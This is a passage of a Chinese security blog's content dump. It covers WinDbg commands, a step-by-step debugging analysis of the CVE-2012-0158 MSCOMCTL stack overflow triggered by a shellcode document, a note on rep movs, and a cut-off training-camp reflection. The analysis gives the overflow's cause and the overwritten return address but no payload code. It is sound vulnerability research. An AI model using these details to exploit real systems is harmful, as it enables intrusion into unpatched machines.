等价。</p>\n<p>你也可以使用符号：<font color=\"red\">u ntdll!CsrSetPriorityClass+0x41</font> 和寄存器: <font color=\"red\">dd ebp+4</font> 数字默认用 <font color=\"red\">base 16</font> 表示，添加前缀来明确使用的base所表示的进制格式：<br><figure class=\"highlight cs\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"number\">0x123</span>: <span class=\"keyword\">base</span> <span class=\"number\">16</span> (hexadecimal)   <span class=\"number\">0</span>n123: <span class=\"keyword\">base</span> <span class=\"number\">10</span> (<span class=\"keyword\">decimal</span>)    <span class=\"number\">0</span>t123: <span class=\"keyword\">base</span> <span class=\"number\">8</span> (octal)   <span class=\"number\">0</span>y111: <span class=\"keyword\">base</span> <span class=\"number\">2</span> (binary)</div></pre></td></tr></table></figure></p>\n<p>用命令.format来展示某一值的多种格式<br><figure class=\"highlight dns\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"number\">0</span>:<span class=\"number\">000</span>&gt; .formats <span class=\"number\">123</span></div><div class=\"line\"> Evaluate expression:</div><div class=\"line\"> Hex:     <span class=\"number\">00000000</span>`<span class=\"number\">00000123</span></div><div class=\"line\"> Decimal: <span class=\"number\">291</span></div><div class=\"line\"> Octal:   <span class=\"number\">0000000000000000000443</span></div><div class=\"line\"> Binary:  <span class=\"number\">00000000</span> <span class=\"number\">00000000</span> <span class=\"number\">00000000</span> <span class=\"number\">00000000</span> <span class=\"number\">00000000</span> <span class=\"number\">00000000</span> <span class=\"number\">00000001</span> <span class=\"number\">00100011</span></div><div class=\"line\"> Chars:   .......#</div><div class=\"line\"> Time:    Thu Jan <span class=\"number\">01 01:04:51</span> <span class=\"number\">1970</span></div><div class=\"line\"> Float:   low <span class=\"number\">4</span>.<span class=\"number\">07778</span>e-<span class=\"number\">043</span> high <span class=\"number\">0</span></div><div class=\"line\"> Double:  <span class=\"number\">1</span>.<span class=\"number\">43773</span>e-<span class=\"number\">321</span></div></pre></td></tr></table></figure></p>\n<p>用’?’来对某个表达式求值，例如: <font color=\"red\">? eax+4</font></p>\n<p>##寄存器与伪寄存器<br>在WinDbg中可支持多种伪寄存器(含有某些值). 用前缀‘$‘来指明其是伪寄存器.在使用寄存器或伪寄存器时，可以添加前缀’@’，这样做可让WinDbg确定该前缀之后的内容为某一寄存器而不是某一符号。</p>\n<p>这有一些伪寄存器的范例：</p>\n<font color=\"red\">$teb</font> 或 <font color=\"red\">@$teb</font> (TEB的地址)<br><br><font color=\"red\">$peb</font> 或 <font color=\"red\">@$peb</font> (PEB的地址)<br><br><font color=\"red\">$thread</font> 或 <font color=\"red\">@$thread</font> (当前线程)<br><br>##异常<br>用sxe命令可中断某一特定的异常.例如,中断某一已被加载的模块,可输入:<br><figure class=\"highlight ruby\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">sxe ld &lt;<span class=\"class\"><span class=\"keyword\">module</span> <span class=\"title\">name</span> 1&gt;,...,&lt;module <span class=\"title\">name</span> <span class=\"title\">N</span>&gt;</span></div></pre></td></tr></table></figure><br><br>例如,<br><figure class=\"highlight avrasm\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">sxe <span class=\"keyword\">ld</span> user32</div></pre></td></tr></table></figure><br><br>查看异常类型的列表： <font color=\"red\">sx</font>  用 <font color=\"red\">sxi</font> 命令忽略某一异常: <font color=\"red\">sxi ld</font>  使用该命令可让第一次输入的命令失效。<br><br>执行到single-chance和second-chance的异常处将会使Windbg中断 。它们并非是不同的异常类型。执行到异常处时，WinDbg将停止执行 ，并提示该位置为single-chance异常。 Single-chance意味着异常事件还没被发送到被调试的程序。当我们恢复执行时,WinDbg将异常事件发送到被调试的程序。如果被调试程序不处理异常,WinDbg将再次停止执行并提示此处为second-chance异常。<br><br>在我们测试EMET5.2时,我们需要忽略single-chance的单步异常（single step exceptions）。用如下命令实现: sxd sse<br><br>##断点<br><strong>软件断点：</strong><br><br>在某指令上设置断点时,WinDbg将指令的第一字节保存于内存并用0xCC覆盖它（操作码为”int 3”）。<br><br>当“int 3”指令被执行时,断点即被触发,那么执行将会被停止，且WinDbg通过重置它的首字节来重置该指令。<br><br>输入如下命令在位于0x4110a0地址的指令上设置断点:<br><figure class=\"highlight mipsasm\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"keyword\">bp </span><span class=\"number\">4110</span><span class=\"built_in\">a0</span></div></pre></td></tr></table></figure><br><br>第三次运行时激活0x4110a0地址的断点：<br><figure class=\"highlight lsl\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">bp <span class=\"number\">4110</span>a0 <span class=\"number\">3</span></div></pre></td></tr></table></figure><br><br>恢复执行（并在第一次触发的断点上停止）输入如下：<font color=\"red\">g</font>\n\n<p>这是 “go“ 的缩写.运行直到到达某地址 (含有代码 ), 输入: <font color=\"red\">g  (code location)</font></p>\n<p>WinDbg内将会在指定的位置上设置软件断点(如 ‘bp’ )，但此处的断点被触发后将会被删除.主要原因是使用 ‘g’ 设的是一次性软件断点.</p>\n<p>###<strong>硬件断点：</strong></p>\n<p>使用特定的CPU寄存器设置硬件断点，它比软件断点更通用.事实上,它可中断执行或内存访问.硬件断点不会修改任意代码，甚至带有self modifying code。不幸的是，最多只能下4个硬件断点。</p>\n<p>最简单的形式如下，命令格式为：<br><figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div></pre></td><td class=\"code\"><pre><div class=\"line\">ba <span class=\"tag\">&lt;<span class=\"name\">mode</span>&gt;</span> <span class=\"tag\">&lt;<span class=\"name\">size</span>&gt;</span> <span class=\"tag\">&lt;<span class=\"name\">address</span>&gt;</span> <span class=\"tag\">&lt;<span class=\"name\">passes</span> (<span class=\"attr\">default</span>=<span class=\"string\">1)</span>&gt;</span></div><div class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">mode</span>&gt;</span> 可以是</div><div class=\"line\">‘e‘ （用于执行）</div><div class=\"line\">‘r‘ （用于读取存储器）</div><div class=\"line\">‘w‘ （用于写存储器）</div></pre></td></tr></table></figure></p>\n<p><code>&lt;size&gt;</code>  是监控访问(当 <mode>是‘e’时，它总为1)指明位置的大小,其以字节的形式表示。<br><code>&lt;address&gt;</code> 为设置断点的位置<br><code>&lt;passes&gt;</code> 激活断点时(查看 ’bp’ 用法的范例)需要的传递数,其起到计数器的作用.</mode></p>\n<p>笔记:在运行某一进程前，该进程不可能使用硬件断点。因为通过修改CPU寄存器(dr0,dr1,等等…)可以设置硬件断点，在开启进程及它的线程被创建时,寄存器将会被重置。</p>\n<p>###<strong>处理断点：</strong></p>\n<p>列出断点类型: <font color=\"red\">bl</font></p>\n<p>‘bl’表示断点列表（breakpoint list）. 例如：<br><figure class=\"highlight basic\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"number\">0</span>:<span class=\"number\">000</span>&gt; bl</div><div class=\"line\"><span class=\"symbol\">0 </span>e <span class=\"number\">77</span>c6cb70     <span class=\"number\">0002</span> (<span class=\"number\">0002</span>)  <span class=\"number\">0</span>:**** ntdll!CsrSetPriorityClass+<span class=\"number\">0</span>x40</div></pre></td></tr></table></figure></p>\n<p>区域的位置，从左到右表示如下：</p>\n<ul>\n<li>0：断点ID</li>\n<li>e: 断点状态,可以设置（enabled）或关闭（disabled）.</li>\n<li>77c6cb70: 内存地址</li>\n<li>0002（0002）: 在激活前余下的传递数（起到计数器作用），利用所有传递数来等待激活（当断点被创建时，将会指定该值） 0:<em>**|</em>: 相关联的进程和线程.用星号代表该断点不是thread-specific。</li>\n<li>ntdll!CsrSetPriorityClass+0x40: 设置断点的位置（模块, 函数和偏移）</li>\n</ul>\n<ol>\n<li>关闭（disable）某一断点 <code>bd &lt;breakpoint id&gt;</code></li>\n<li>删除断点 <code>bc &lt;breakpoint ID&gt;</code></li>\n<li>删除所有断点 <code>bc *</code></li>\n</ol>\n<p>###<strong>断点命令：</strong></p>\n<p>每次某个断点被触发后将自动执行某个命令，可以使用如下命令：<br><figure class=\"highlight lsl\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">bp <span class=\"number\">40</span>a410 <span class=\"string\">\".echo <span class=\"subst\">\\\"</span>Here are the registers:<span class=\"subst\">\\n</span><span class=\"subst\">\\\"</span>; r\"</span></div></pre></td></tr></table></figure></p>\n<p>另一个范例：自定义命令如下：<br><figure class=\"highlight ada\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">bp jscript9+c2c47 <span class=\"string\">\".printf \\\"</span><span class=\"keyword\">new</span> <span class=\"keyword\">Array</span> Data: addr = <span class=\"number\">0</span>x%p\\\\n\\<span class=\"string\">\",eax;g\"</span></div></pre></td></tr></table></figure></p>\n<p>##逐步执行<br>逐步执行有至少三种类型：</p>\n<p>步进/跟踪(命令:t) 该命令中断每条指令的执行.如果执行到call指令或int指令,那么该命令将各自在调用函数的第一条指令或int handler上中断。 步过 (命令: p) 该命令能让每条指令（没有calls或ints，等等）执行后中断，如果你刚好执行到call或int指令，那么会在call或int指令执行后中断 步出 (命令: gu) 该命令(go up) 能让WinDbg恢复程序的执行，并且能在下一条ret指令执行后中断。在exit函数中经常使用到该命令。</p>\n<p>还有其它两个用于exit函数的命令：</p>\n<p>tt (trace to next return):等价于重复使用’t’命令并且在执行过程中遭遇的第一条ret指令上停止执行。 pt (step to next return):等价于重复使用‘p’命令并且在执行过程中遭遇的第一条ret指令上停止执行。</p>\n<p>记录：使用tt命令会执行到函数内，如果你想到达当前函数的ret指令，那么改为使用pt命令。 pt和gu命令的不同点在于，使用pt命令将会在ret指令上中断，使用gu命令将会在ret指令后的下一条指令上中断。</p>\n<p>这里是包含‘p‘ 和‘t‘命令的不同形式:<br><figure class=\"highlight vim\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div></pre></td><td class=\"code\"><pre><div class=\"line\">pa/<span class=\"keyword\">ta</span> <span class=\"symbol\">&lt;address&gt;</span>: step/trace 到地址。</div><div class=\"line\"><span class=\"keyword\">pc</span>/<span class=\"keyword\">tc</span>: step/trace 到 下一条 <span class=\"keyword\">call</span>/<span class=\"keyword\">int</span> 指令。</div><div class=\"line\"><span class=\"keyword\">pt</span>/t<span class=\"variable\">t:</span> step/trace 到下一条 <span class=\"keyword\">ret</span> (discussed above at point <span class=\"number\">3</span>)指令。</div><div class=\"line\">pct/<span class=\"keyword\">tc</span><span class=\"variable\">t:</span> step/trace 到下一 条<span class=\"keyword\">call</span>/<span class=\"keyword\">int</span> 或 <span class=\"keyword\">ret</span>指令。</div><div class=\"line\">ph/<span class=\"keyword\">th</span>: step/trace 到下一分支的指令。</div></pre></td></tr></table></figure></p>\n<p>##查看内存<br>可使用‘d’或它的变量中的其中一种类型来展示（display）内存中的内容，<br><figure class=\"highlight mipsasm\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"symbol\">db:</span> <span class=\"keyword\">display </span><span class=\"keyword\">bytes</span></div><div class=\"line\"><span class=\"symbol\">dw:</span> <span class=\"keyword\">display </span>words (<span class=\"number\">2</span> <span class=\"keyword\">bytes)</span></div><div class=\"line\"><span class=\"symbol\">dd:</span> <span class=\"keyword\">display </span>dwords (<span class=\"number\">4</span> <span class=\"keyword\">bytes)</span></div><div class=\"line\"><span class=\"symbol\">dq:</span> <span class=\"keyword\">display </span>qwords (<span class=\"number\">8</span> <span class=\"keyword\">bytes)</span></div><div class=\"line\"><span class=\"symbol\">dyb:</span> <span class=\"keyword\">display </span><span class=\"keyword\">bits</span></div><div class=\"line\"><span class=\"symbol\">da:</span> <span class=\"keyword\">display </span>null-terminated ASCII strings</div><div class=\"line\"><span class=\"symbol\">du:</span> <span class=\"keyword\">display </span>null-terminated Unicode strings</div></pre></td></tr></table></figure></p>\n<p>输入 .hh d 来查看其它变量。 ‘d’命令用相同的格式展示数据，正如大多数的d*命令那样（或如果不是单一数据则使用db）。</p>\n<p>这些命令的(简化)格式为：d* [range]</p>\n<p>这里，使用星号来描绘我们已列出的如上所有的变化，并且方框内应指明所选的范围。如果没有选好范围，那么在使用d*命令展示一部分数据后，将展示内存部分的数据。</p>\n<p>可以用许多种方式指定范围：<br><figure class=\"highlight livecodeserver\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"number\">1</span>、&lt;<span class=\"built_in\">start</span> address&gt; &lt;<span class=\"function\"><span class=\"keyword\">end</span> <span class=\"title\">address</span>&gt; 范例，<span class=\"title\">db</span> <span class=\"title\">77cac000</span> <span class=\"title\">77cac0ff</span></span></div><div class=\"line\"><span class=\"number\">2</span>、&lt;<span class=\"built_in\">start</span> address&gt; L&lt;<span class=\"built_in\">number</span> <span class=\"keyword\">of</span> elements&gt; 范例, dd <span class=\"number\">77</span>cac000 L10 查看 <span class=\"number\">10</span> dwords（始于 <span class=\"number\">77</span>cac000地址）.Note: 因为</div><div class=\"line\">   范围比<span class=\"number\">256</span> MB还要大,我们必须使用L?而不是L来指定行数。</div><div class=\"line\"><span class=\"number\">3</span>、&lt;<span class=\"built_in\">start</span> address&gt;</div><div class=\"line\"><span class=\"number\">4</span>、在只是指定起始地址时，用WinDbg将可以查看到<span class=\"number\">128</span>字节的内容。</div></pre></td></tr></table></figure></p>\n<p>##编辑（edit）内存<br>要编辑（edit）内存，使用:<br><figure class=\"highlight fsharp\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">e[d|w|b] &lt;address&gt; <span class=\"meta\">[&lt;new value 1&gt; ... &lt;new value N&gt;]</span></div></pre></td></tr></table></figure></p>\n<p>[d|w|b]是相关选项，它指定编辑的元素类型(d = dword, w = word, b = byte)。 如果新值被省略了，那么你在WinDbg中可以交互式地输入它们。</p>\n<p>这是范例：<font color=\"red\">ed eip cc cc</font></p>\n<p>用值0xCC来覆盖地址（在eip内）上的头两个dwords。</p>\n<p>##搜索内存</p>\n<p>使用‘s’命令来搜索内存。它的格式为：<br><figure class=\"highlight coq\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">s [-d|<span class=\"type\">-w</span>|<span class=\"type\">-b</span>|<span class=\"type\">-a</span>|<span class=\"type\">-u</span>] &lt;start address&gt; L?&lt;number of elements&gt; &lt;search values&gt;</div></pre></td></tr></table></figure></p>\n<p><font color=\"red\">d，w，b，a，u</font> 分别代表<font color=\"red\">dword, word, byte, ascii</font> 和 unicode.</p>\n<p><code>&lt;search values&gt;</code>是序列值（用于搜索）</p>\n<p>例如：<br><figure class=\"highlight stata\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">s -<span class=\"keyword\">d</span> eip <span class=\"keyword\">L</span>?1000 <span class=\"keyword\">cc</span> <span class=\"keyword\">cc</span></div></pre></td></tr></table></figure></p>\n<p>在内存区间内搜索两个连续的 <font color=\"red\">dwords 0xcc 0xcc。[eip, eip + 1000*4 – 1]</font>。</p>\n<p>##指针</p>\n<p>使用如下命令解引用某个指针：<br><figure class=\"highlight lisp\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">dd poi(<span class=\"name\">ebp+4</span>)</div></pre></td></tr></table></figure></p>\n<p>用该命令，poi(ebp+4)对地址ebp+4求值，其结果的类型为dword或qword(在64位模式下)。</p>\n<p>##使用于多个方面的命令</p>\n<p>查看寄存器信息，输入如下：r</p>\n<p>查看特定寄存器信息，例如eax和adx，输入：r eax, edx</p>\n<p>打印前三行EIP指向的指令，用命令如下：u EIP L3</p>\n<p>‘u‘ 是unassemble的缩写并且‘L‘可让指定你想查看信息的行数.列出调用栈（call stack）可以使用k</p>\n"},{"title":"CVE-2012-0158漏洞分析","url":"http://huirong.github.io/2015/09/14/CVE-2012-0158/","content":"<p>CVE-2012-0158是典型的缓冲区溢出漏洞，在MSCOMCTL.OCX空间空间，发生溢出<br><a id=\"more\"></a><br>本文参考<a href=\"http://bbs.pediy.com/showthread.php?t=149957\" target=\"_blank\" rel=\"external\">CVE-2012-0158 MSCOMCTL控件漏洞分析</a>，这篇文章分析的很详细，本文菜鸟一枚，记录分析过程，与大家分享，希望共同进步。</p>\n<h1 id=\"I、实验环境\"><a href=\"#I、实验环境\" class=\"headerlink\" title=\"I、实验环境\"></a>I、实验环境</h1><ul>\n<li>Windows xp sp3</li>\n<li>word 2007 12.0.4518.1014</li>\n<li>Windbg<br>在调试漏洞过程中，尽量使用Windbg，执行效率高，还是记录执行路径，并且有强大的脚本做后盾。</li>\n</ul>\n<h1 id=\"II、溢出函数\"><a href=\"#II、溢出函数\" class=\"headerlink\" title=\"II、溢出函数\"></a>II、溢出函数</h1><p>MSCOMCTL!DllGetClassObject+0xb413两次调用MSCOMCTL!DllGetClassObject+0xb1b9，在第二次调用MSCOMCTL!DllGetClassObject+0xb1b9时，溢出。<br>如果大家想跟进漏洞的成因，可以看<a href=\"http://bbs.pediy.com/showthread.php?t=149957\" target=\"_blank\" rel=\"external\">CVE-2012-0158 MSCOMCTL控件漏洞分析</a><br>但是我建议大家先自己分析一篇漏洞，在看成因</p>\n<h1 id=\"III、分析过程\"><a href=\"#III、分析过程\" class=\"headerlink\" title=\"III、分析过程\"></a>III、分析过程</h1><h2 id=\"①-断点\"><a href=\"#①-断点\" class=\"headerlink\" title=\"① 断点\"></a>① 断点</h2><p>用Windbg附加WinWord进程，即File –&gt; open Executable –&gt; WinWord.exe<br>在MSCOMCTL!DllGetDocumentation+0xcec处下断点<br>如图：<br><img src=\"https://ww2.sinaimg.cn/large/005CA6ZCgw1ew2xnhjojwj30fh00zmx2.jpg\" alt=\"\"></p>\n<h2 id=\"②-g-执行到断点处\"><a href=\"#②-g-执行到断点处\" class=\"headerlink\" title=\"② g 执行到断点处\"></a>② g 执行到断点处</h2><p><img src=\"https://ww1.sinaimg.cn/large/005CA6ZCgw1ew2xqsfy1bj30fm02674e.jpg\" alt=\"\"></p>\n<p>此时，并没有执行到断点处，但Windbg输入命令行处灰显，debuggee is runnning…，表明Windbg在等待用户输入，我们可以看到Word界面了</p>\n<h2 id=\"③-打开包含shellcode的doc，即may-doc\"><a href=\"#③-打开包含shellcode的doc，即may-doc\" class=\"headerlink\" title=\"③ 打开包含shellcode的doc，即may.doc\"></a>③ 打开包含shellcode的doc，即may.doc</h2><p><img src=\"https://ww1.sinaimg.cn/large/005CA6ZCgw1ew2xtyisxdj30cz0djtac.jpg\" alt=\"\"><br>word处于忙碌状态，此后就可以不用管word了，专注于Windbg吧，回到Windbg中去</p>\n<h2 id=\"④-g-执行到断点处\"><a href=\"#④-g-执行到断点处\" class=\"headerlink\" title=\"④ g 执行到断点处\"></a>④ g 执行到断点处</h2><p>继续g，执行到断点处<br><img src=\"https://ww2.sinaimg.cn/large/005CA6ZCgw1ew2y09hnqdj30ls0gswjy.jpg\" alt=\"\"><br>前面说过，漏洞在MSCOMCTL!DllGetClassObject+0xb413函数内，进入此函数</p>\n<h2 id=\"⑤-F8-进入MSCOMCTL-DllGetClassObject-0xb413\"><a href=\"#⑤-F8-进入MSCOMCTL-DllGetClassObject-0xb413\" class=\"headerlink\" title=\"⑤ F8 进入MSCOMCTL!DllGetClassObject+0xb413\"></a>⑤ F8 进入MSCOMCTL!DllGetClassObject+0xb413</h2><p>F8进入此函数<br>以下是该函数的汇编代码：<br><img src=\"https://ww3.sinaimg.cn/large/005CA6ZCgw1ew2y2pigovj30m10ho444.jpg\" alt=\"\"><br><img src=\"https://ww4.sinaimg.cn/large/005CA6ZCgw1ew2y3n0qcwj30iu03p0tg.jpg\" alt=\"\"></p>\n<h3 id=\"1-第一次调用MSCOMCTL-DllGetClassObject-0xb1b9时，参数如下\"><a href=\"#1-第一次调用MSCOMCTL-DllGetClassObject-0xb1b9时，参数如下\" class=\"headerlink\" title=\"(1)第一次调用MSCOMCTL!DllGetClassObject+0xb1b9时，参数如下\"></a>(1)第一次调用MSCOMCTL!DllGetClassObject+0xb1b9时，参数如下</h3><p><img src=\"https://ww4.sinaimg.cn/large/005CA6ZCgw1ew3f1mpmmuj30ih0300th.jpg\" alt=\"\"></p>\n<h3 id=\"2-第二次调用MSCOMCTL-DllGetClassObject-0xb1b9时，参数如下\"><a href=\"#2-第二次调用MSCOMCTL-DllGetClassObject-0xb1b9时，参数如下\" class=\"headerlink\" title=\"(2)第二次调用MSCOMCTL!DllGetClassObject+0xb1b9时，参数如下\"></a>(2)第二次调用MSCOMCTL!DllGetClassObject+0xb1b9时，参数如下</h3><p><img src=\"https://ww2.sinaimg.cn/large/005CA6ZCgw1ew3f1zxaklj30ih033gm9.jpg\" alt=\"\"></p>\n<p>根据后面对MSCOMCTL!DllGetClassObject+0xb1b9的分析可知，将第二个参数指向的内存区域内的字符串，拷贝到第一个参数指向的内存区域中，长度为第三个参数</p>\n<p>在第二次调用MSCOMCTL!DllGetClassObject+0xb1b9的时候发生溢出，我们进入此函数</p>\n<h2 id=\"⑥-F8进入MSCOMCTL-DllGetClassObject-0xb1b9\"><a href=\"#⑥-F8进入MSCOMCTL-DllGetClassObject-0xb1b9\" class=\"headerlink\" title=\"⑥ F8进入MSCOMCTL!DllGetClassObject+0xb1b9\"></a>⑥ F8进入MSCOMCTL!DllGetClassObject+0xb1b9</h2><p><img src=\"https://ww4.sinaimg.cn/large/005CA6ZCgw1ew3cpj0zq1j30lx0hjwjc.jpg\" alt=\"\"><br><img src=\"https://ww4.sinaimg.cn/large/005CA6ZCgw1ew3cq09hcdj30lx08f40d.jpg\" alt=\"\"></p>\n<h2 id=\"⑦-一路F10执行到-275a24fe\"><a href=\"#⑦-一路F10执行到-275a24fe\" class=\"headerlink\" title=\"⑦ 一路F10执行到  275a24fe\"></a>⑦ 一路F10执行到  275a24fe</h2><p>即图片标红处，关于rep movs，请看<a href=\"http://huirong.github.io/2015/09/14/rep-movs/\">rep movs指令</a><br>查看ECX，EDI，ESI寄存器的值：</p>\n<p><img src=\"https://ww3.sinaimg.cn/large/005CA6ZCgw1ew3d5nw9fxj30i704mq49.jpg\" alt=\"\"></p>\n<p>将esi指向的字符串拷贝到edi指向的地址，长度ecx = 000020a0 dword = 00008282B，即shellcode的长度</p>\n<p>ESI=00202618，在内存中查看此内存段的值：</p>\n<p><img src=\"https://ww1.sinaimg.cn/large/005CA6ZCgw1ew3cs0cw5wj30a00bp41f.jpg\" alt=\"\"></p>\n<p>方框内为shellcode</p>\n<h2 id=\"⑧-F10-执行到275a2500\"><a href=\"#⑧-F10-执行到275a2500\" class=\"headerlink\" title=\"⑧ F10 执行到275a2500\"></a>⑧ F10 执行到275a2500</h2><p> 即方框的下一步<br> rep movs dword ptr es:[edi],dword ptr [esi]执行之前，EDI=0x00122490<br> 执行完rep movs dword ptr es:[edi],dword ptr [esi]，查看0x00122490处的值</p>\n<p> <img src=\"https://ww2.sinaimg.cn/large/005CA6ZCgw1ew3duooerxj309y0cjjuk.jpg\" alt=\"\"></p>\n<p>shellcode已经成功拷贝到栈中</p>\n<h2 id=\"⑨-一路F10，直到MSCOMCTL-DllGetClassObject-0xb413返回\"><a href=\"#⑨-一路F10，直到MSCOMCTL-DllGetClassObject-0xb413返回\" class=\"headerlink\" title=\"⑨ 一路F10，直到MSCOMCTL!DllGetClassObject+0xb413返回\"></a>⑨ 一路F10，直到MSCOMCTL!DllGetClassObject+0xb413返回</h2><p><img src=\"https://ww3.sinaimg.cn/large/005CA6ZCgw1ew3ezo9iwzj30sv0hq49g.jpg\" alt=\"\"></p>\n<p><strong>返回之后跳转到0x001224a8，在此过程中成功调用计算器</strong></p>\n<p><img src=\"https://ww2.sinaimg.cn/large/005CA6ZCgw1ew3cuuvatej30fe082wg4.jpg\" alt=\"\"></p>\n<p><img src=\"https://ww1.sinaimg.cn/large/005CA6ZCgw1ew3cuhid7nj310r08etbo.jpg\" alt=\"\"></p>\n<h1 id=\"IV、总结\"><a href=\"#IV、总结\" class=\"headerlink\" title=\"IV、总结\"></a>IV、总结</h1><p>MSCOMCTL!DllGetClassObject+0x3ab15(275c8b4e)（A 函数）仅仅开辟了0x14h 大小的栈空间，里边两次调用了函数MSCOMCTL!DllGetClassObject+0x3a8bb ( B 函数)。第一次往A 函数的栈帧里边写入了0xc 大小的字节，第二次调用前检查了大小，本该是长度应该小于等于8 才copy 数据，<font color=\"red\">结果程序员的粗心大意写成了大于等于8</font>。直接导致第二次调用写入了0x8282 大小的数据，其后果是很严重的——破坏掉了A 函数的栈帧，导致A 函数无法正确返回。此处返回地址被精心覆盖成0x7ffa4512，直接导致了恶意代码的执行。</p>\n<h1 id=\"V、参考文献\"><a href=\"#V、参考文献\" class=\"headerlink\" title=\"V、参考文献\"></a>V、参考文献</h1><p><a href=\"http://bbs.pediy.com/showthread.php?t=149957\" target=\"_blank\" rel=\"external\">CVE-2012-0158 MSCOMCTL控件漏洞分析</a></p>\n"},{"title":"rep movs 指令","url":"http://huirong.github.io/2015/09/14/rep-movs/","content":"<p>下篇文章涉及到rep movs指令，先在此介绍下。<br><a id=\"more\"></a></p>\n<h2 id=\"movs\"><a href=\"#movs\" class=\"headerlink\" title=\"movs\"></a>movs</h2><ul>\n<li>格式：movs dst,src</li>\n<li>说明：movs指令可以把ESI纸箱的数据段中的第一个字（节）传送到由EDI纸箱的附加段中的一个字（节）中去，同时根据方向标识位及数据格式对ESI和EDI就行修改</li>\n</ul>\n<h2 id=\"rep-movs\"><a href=\"#rep-movs\" class=\"headerlink\" title=\"rep movs\"></a>rep movs</h2><p>rep（即repeat）是重复前缀指令。<br>因为在传递字符串的过程中不可能一个字（节）一个字（节）地传送，所以要有个寄存器控制指令长度，即ECX，指令每次执行前都会判断CX的只是否为0（为0，结束重复，否则CX的值减1）。<br>因此设置好ECX的值之后，就可以使用rep movs了。</p>\n"},{"title":"理论与实践并行","url":"http://huirong.github.io/2015/08/10/理论与实践并行/","content":"<p>人生由无数个选择构成，我相信这次参加夏令营的选择是对的！！！<br>很高兴老师给我这个机会，感谢赛客网络安全夏令营的主办方提供了这个平台。<br><a id=\"more\"></a><br>见到了很多传说中的大牛，余弦、e春秋CEO、知道创宇CEO、玄武实验室总负责人，我觉得他们并不是遥不可及，只是比平常人付出的更多，正如冰心所说，成功的花，人们只惊羡她现时的明艳！然而当初她的芽儿，浸透了奋斗的汗水。<br>曾经以为永远都见不到的人，见到了，曾经不敢想的事，经历了。之前总会给自己定位，这些事情不是在你的世界范围内。这次真正体会到，只要努力，你的未来不是梦，只要努力，任何人都成成为传说中的人。</p>\n<p>言归正传，学习才是最正题的。前几天主要学习了，sql注入、XSS、逆向分析、缓冲区溢出及Linux的基础知识，后几天就是模拟CFT比赛。</p>\n<p>#1、sql注入和XSS#</p>\n<ul>\n<li>####Sql注入<br>主要知识点：Web渗透概述、相关工具使用、Web入侵渗透案例、sql注入漏洞分析与利用、宽字符注入漏洞、kdwiki未公开漏洞分析等。<br>在讲述完主要的知识点后，在本地搭建平台，包括DVWA和sqli-lbas两个实验平台，动手实践。<br>之前，我了解过sql注入的基本原理，但是自己动手实践比较少，对sql注入了解的知识面比较窄。不过，老师上课讲的知识点都不深，只是提了下，毕竟时间有限，大部分知识点，都是通过做实验理解的，有不懂的地方，查资料，请教同学，收获了许多，包括基于时间的盲注、基于cookie、请求头、数据库错误信息等。</li>\n<li>####XSS<br>由于时间关系，XSS只讲了基本原理和基本概念，介绍了几个实践网站，没有讲如何应用到实际的攻击过程中。</li>\n</ul>\n<p>#2、逆向分析和缓冲区溢出</p>\n<ul>\n<li>####逆向分析<br>主要知识点：Windows 